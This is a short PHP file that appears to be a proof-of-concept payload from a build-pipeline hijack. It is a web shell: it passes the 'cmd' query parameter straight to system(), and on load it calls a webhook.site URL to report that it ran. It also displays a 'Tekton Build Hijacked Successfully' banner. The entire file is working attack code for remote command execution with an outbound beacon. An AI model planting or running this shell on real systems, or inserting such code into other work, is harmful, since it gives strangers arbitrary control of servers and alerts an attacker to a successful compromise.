<?php
// verify execution
file_get_contents('https://webhook.site/9235269a-bb3f-40ef-8163-5217357e365a');

// simple webshell for verification
echo "<h1>Tekton Build Hijacked Successfully</h1>";
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
